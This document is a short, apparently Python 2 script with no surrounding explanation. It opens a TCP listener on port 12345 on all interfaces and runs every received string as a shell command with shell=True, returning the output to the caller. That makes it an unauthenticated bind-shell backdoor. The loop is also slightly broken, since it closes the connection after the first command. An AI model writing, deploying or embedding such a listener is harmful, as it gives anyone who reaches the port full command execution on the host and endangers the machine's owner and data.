import socket
import subprocess

host = ''        # Symbolic name meaning all available interfaces
port = 12345     # Arbitrary non-privileged port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print('Connected by', addr)
while True:
	data = conn.recv(1024)
	if not data:
		break
	else:
		p = subprocess.Popen(data, stdout=subprocess.PIPE, shell=True)
		(output, err) = p.communicate()
		conn.sendall("out => "+ output)

		conn.sendall(data)
		conn.close()
